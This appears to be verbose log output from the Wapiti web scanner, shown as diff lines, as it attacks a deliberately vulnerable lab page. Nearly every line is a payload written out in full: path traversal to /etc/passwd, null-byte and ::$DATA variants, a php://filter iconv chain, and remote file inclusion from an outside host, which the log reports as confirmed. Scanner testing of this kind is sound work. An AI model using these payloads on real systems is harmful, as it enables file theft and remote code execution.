+2024-03-20 16:55:51.276 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&language=lang_nl.php (1)
+2024-03-20 16:55:51.292 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&language=lang_nl.php (1)
+2024-03-20 16:55:51.311 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&language=lang_nl.php (1)
+2024-03-20 16:55:51.331 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.349 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.361 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.371 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.381 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.392 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.403 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.413 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.425 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.436 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.447 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&language=lang_nl.php (1)
+2024-03-20 16:55:51.458 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&language=lang_nl.php (1)
+2024-03-20 16:55:51.470 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&language=lang_nl.php (1)
+2024-03-20 16:55:51.482 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.497 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.513 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.524 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.534 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.544 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.554 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.564 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.574 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.584 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.598 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&language=lang_nl.php (1)
+2024-03-20 16:55:51.613 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&language=lang_nl.php (1)
+2024-03-20 16:55:51.627 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.644 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.660 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.677 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.695 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.712 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.729 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.746 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.763 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.781 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.798 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=file%3A%2F%2F%2Fetc%2Fpasswd&language=lang_nl.php (1)
+2024-03-20 16:55:51.815 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.833 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&language=lang_nl.php (1)
+2024-03-20 16:55:51.851 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.869 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.890 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.903 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&language=lang_nl.php (1)
+2024-03-20 16:55:51.916 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.925 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=rlfi.php&language=lang_nl.php (1)
+2024-03-20 16:55:51.934 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=rlfi.php%00&language=lang_nl.php (1)
+2024-03-20 16:55:51.947 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=rlfi.php%3A%3A%24DATA&language=lang_nl.php (1)
+2024-03-20 16:55:51.966 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/rlfi.php?action=go&language=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (1)
+2024-03-20 16:55:52.261 | RED      | wapitiCore.attack.mod_file:attack:250 - ---
+2024-03-20 16:55:52.262 | RED      | wapitiCore.attack.mod_file:attack:251 - Remote inclusion vulnerability in http://web/rlfi.php via injection in the parameter language
+2024-03-20 16:55:52.262 | RED      | wapitiCore.attack.mod_file:attack:261 - Evil request:
+2024-03-20 16:55:52.262 | RED      | wapitiCore.attack.mod_file:attack:262 -     GET /rlfi.php?action=go&language=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: security_level=0
+2024-03-20 16:55:52.262 | RED      | wapitiCore.attack.mod_file:attack:263 - ---
+2024-03-20 16:55:52.277 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/rlfi.php (1)
+2024-03-20 16:55:52.289 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109
+2024-03-20 16:55:52.292 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&bug=109
+2024-03-20 16:55:52.301 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&bug=109
+2024-03-20 16:55:52.309 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2Fetc%2Fpasswd&bug=109
+2024-03-20 16:55:52.316 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2Fetc%2Fpasswd%00&bug=109
+2024-03-20 16:55:52.325 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2Fetc%2Fservices&bug=109
+2024-03-20 16:55:52.333 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2Fetc%2Fservices%00&bug=109
+2024-03-20 16:55:52.342 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&bug=109
+2024-03-20 16:55:52.351 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&bug=109
+2024-03-20 16:55:52.359 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&bug=109
+2024-03-20 16:55:52.366 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=109
+2024-03-20 16:55:52.375 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=109
+2024-03-20 16:55:52.382 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&bug=109
+2024-03-20 16:55:52.390 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&bug=109
+2024-03-20 16:55:52.398 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&bug=109
+2024-03-20 16:55:52.405 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=109
+2024-03-20 16:55:52.412 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=109
+2024-03-20 16:55:52.419 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=109
+2024-03-20 16:55:52.425 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=109
+2024-03-20 16:55:52.433 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=109
+2024-03-20 16:55:52.441 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=109
+2024-03-20 16:55:52.449 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=109
+2024-03-20 16:55:52.457 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=109
+2024-03-20 16:55:52.465 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=109
+2024-03-20 16:55:52.473 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=109
+2024-03-20 16:55:52.480 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=109
+2024-03-20 16:55:52.488 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
